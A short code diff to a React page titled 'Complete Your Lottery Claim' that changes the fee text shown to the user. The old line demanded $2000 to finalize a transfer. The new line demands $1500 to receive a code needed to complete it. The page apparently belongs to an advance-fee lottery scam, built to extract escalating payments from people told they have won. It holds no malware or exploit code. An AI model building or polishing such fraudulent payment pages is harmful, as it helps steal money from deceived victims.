@@ -178,9 +178,7 @@ const TransferPage = () => {
               Complete Your Lottery Claim
             </h2>
             <p className="text-gray-700 mb-6">
-              To finalize your transfer, a fee of <strong>$2000</strong> is
-              required. Please proceed to make the payment and return here to
-              complete the process.
+              Before proceeding with the payment, a fee of <strong>$1500</strong> must be paid to receive the code required to complete the transfer.
             </p>
             <div className="flex justify-end">
               <button
